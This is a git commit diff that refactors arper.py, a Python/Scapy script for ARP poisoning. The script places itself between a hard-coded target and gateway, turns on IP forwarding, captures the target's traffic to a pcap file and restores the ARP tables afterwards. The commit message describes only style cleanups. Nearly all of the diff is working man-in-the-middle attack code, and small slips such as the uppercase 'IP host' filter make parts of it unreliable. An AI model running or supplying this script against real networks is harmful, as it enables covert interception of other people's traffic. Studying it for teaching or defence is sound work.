3a9fc9eeaddef2b2d3304175466c50cf4bb1339f
Coal0 <Coal0@users.noreply.github.com>
2017-07-25 17:49:24 +0200

    Update arper.py
    * Improved PEP-8-compliance;
    * Removed explicit `return None`;
    * Removed unnecessary parentheses (`if` statements);
    * Wrapped sniffing in a `try:`/ `except KeyBoardInterrupt:` / `finally:` statement to make sure `restore_target()` is always called;
    * Improved argument names for `restore_target()` and `poison_target()`;
    * Wrapped 'main' logic into a `main()` function.

--- MiTM/arper.py
+++ MiTM/arper.py
@@ -4,76 +4,85 @@ import sys
 import threading
 import signal
 
-def restore_target(g_ip,g_mac,t_ip,t_mac):
-    send(ARP(op=2, psrc=g_ip,pdst=t_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=g_mac,count=5))
-    send(ARP(op=2, psrc=t_ip,pdst=g_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=t_mac,count=5))
 
+def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    send(ARP(op=2, psrc=gateway_ip,pdst=target_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=gateway_mac,count=5))
+    send(ARP(op=2, psrc=target_ip,pdst=gateway_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=target_mac,count=5))
     os.kill(os.getpid(), signal.SIGINT)
     
+    
 def get_mac(ip):
-    responses,unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=2,retry=10)
+    """Return a MAC address bound to an IP address.
+    """
+    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip),timeout=2,retry=10)
     for s,r in responses:
         return r[Ether].src
-    return None
 
-def poison_target(g_ip,g_mac,t_ip,t_mac):
-    poison_target           = ARP()
-    poison_target.op        = 2
-    poison_target.psrc      = g_ip
-    poison_target.pdst      = t_ip
-    poison_target.hwdst     = t_mac
+
+def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    """Start ARP poisoning for a specified target and gateway.
+    """
+    poison_target = ARP()
+    poison_target.op = 2
+    poison_target.psrc = gateway_ip
+    poison_target.pdst = target_ip
+    poison_target.hwdst = target_mac
 
     poison_gateway = ARP()
-    poison_gateway.op       = 2
-    poison_gateway.psrc     = t_ip
-    poison_gateway.pdst     = g_ip
-    poison_gateway.hwdst    = g_mac
+    poison_gateway.op = 2
+    poison_gateway.psrc = target_ip
+    poison_gateway.pdst = gateway_ip
+    poison_gateway.hwdst = gateway_mac
 
-    print '[*] Beginning the ARP poison'
+    print("[*] Beginning the ARP poison")
     while True:
         try:
             send(poison_target)
             send(poison_gateway)
-
-            time.sleep(2)
+            time.sleep(1)
         except KeyboardInterrupt:
-            restore_target(g_ip,g_mac,t_ip,t_mac)
-    print '[*] Attack finished'
+            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    print('[*] Attack finished')
 
-    
-interface = 'wlan0'
-target_ip = '192.168.1.70'
-gateway_ip = '192.168.1.1'
-packet_count = 1000
 
-os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-conf.verb = 0
+def main():
+    interface = 'wlan0'
+    target_ip = '192.168.1.70'
+    gateway_ip = '192.168.1.1'
+    packet_count = 1000
 
-print '[*] setting up %s' % interface
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+    conf.verb = 0
 
-# Gateway // Router
-gateway_mac = get_mac(gateway_ip)
-if(gateway_mac is None):
-    print '[!] Failed to get gateway'
-    sys.exit(0)
-print '[*] Gateway %s is at %s' % (gateway_ip, gateway_mac)
+    print("[*] setting up {}".format(interface))
 
-# Target
-target_mac = get_mac(target_ip)
-if(target_mac is None):
-    print '[!] Failed to get target'
-    sys.exit(0)
-print '[*] Gateway %s is at %s' % (target_ip, target_mac)
+    gateway_mac = get_mac(gateway_ip)
+    if gateway_mac is None:
+        print ('[!] Failed to get gateway')
+        sys.exit(1)
+    print('[*] Gateway {} is at {}'.format(gateway_ip, gateway_mac))
 
-poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
-poison_thread.start()
+    target_mac = get_mac(target_ip)
+    if target_mac is None:
+        print('[!] Failed to get target')
+        sys.exit(0)
+    print('[*] Gateway {} is at {}'.format(target_ip, target_mac))
 
-try:
-    print '[*] Starting sniffer for %d packets' % packet_count
-    bpf_filter = 'ip host %s' % target_ip
-    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
-    wrpcap('/root/Desktop/arper.pcap', packets)
-except KeyboardInterrupt:
-    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-    sys.exit(0)
-print '[*] Finished capturing packets'
+    poison_thread = threading.Thread(
+        target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
+    poison_thread.start()
+
+    try:
+        print('[*] Starting sniffer for {} packets'.format(packet_count))
+        bpf_filter = 'IP host {}'.format(target_ip)
+        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
+        wrpcap('/root/Desktop/arper.pcap', packets)
+    except KeyboardInterrupt:
+        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+        sys.exit(1)
+    finally:
+        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+        print('[*] Finished capturing packets')
+   
+if __name__ == "__main__":
+    main()
